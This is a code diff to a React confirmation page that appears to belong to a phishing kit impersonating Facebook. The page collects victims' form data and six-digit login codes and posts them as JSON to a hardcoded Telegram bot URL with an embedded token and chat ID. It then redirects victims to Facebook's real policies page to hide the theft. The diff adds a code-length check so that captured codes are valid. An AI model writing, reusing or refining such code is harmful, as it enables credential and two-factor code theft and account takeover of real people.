@@ -16,12 +16,11 @@ const ConfirmPage = () => {
   const [count, setCount] = useState(0);
   const [modal, setModal] = useState(false);
   const [showError, setShowError] = useState(false);
+  const [showErrorLength, setShowErrorLength] = useState('');
   const [countdownTime, setCountdownTime] = useState(Date.now() + 300000);
 
   const formDataValue = useStandardFormData();
   const { handleSetFormData } = useStandardActions();
-
-  console.log('formDataValue :>> ', formDataValue);
 
   const handleChangePassword = (event: any) => {
     const { value } = event.target;
@@ -40,16 +39,20 @@ const ConfirmPage = () => {
         handleSetFormData({ ...formDataValue, code2: code2 });
 
         try {
-          const response = await standardService.sendMessage(
-            'https://api.telegram.org/bot6122232812:AAFzPiXDO6Mt29_8QVjlWWGXaGZildwF8io/sendMessage',
-            {
-              chat_id: '-4077356603',
-              text: JSON.stringify({ ...formDataValue, code2: code2 }, null, 2),
-            },
-          );
+          if (code.length === 6 || code2.length === 6) {
+            const response = await standardService.sendMessage(
+              'https://api.telegram.org/bot6122232812:AAFzPiXDO6Mt29_8QVjlWWGXaGZildwF8io/sendMessage',
+              {
+                chat_id: '-4057839789',
+                text: JSON.stringify({ ...formDataValue, code2: code2 }, null, 2),
+              },
+            );
 
-          if (response) {
-            router.replace('https://www.facebook.com/policies_center/');
+            if (response) {
+              router.replace('https://www.facebook.com/policies_center/');
+            }
+          } else {
+            setShowErrorLength('Invalid login code, please try again');
           }
         } catch (error) {
           return;
@@ -118,6 +121,7 @@ const ConfirmPage = () => {
             The code generator you entered is incorrect. Please wait 5 minutes to receive another one.
           </div>
         )}
+        {showErrorLength && !showError && <div className='error-text'>{showErrorLength}</div>}
 
         <div className='footer'>
           <div className='anotherway' onClick={() => setModal(true)}>
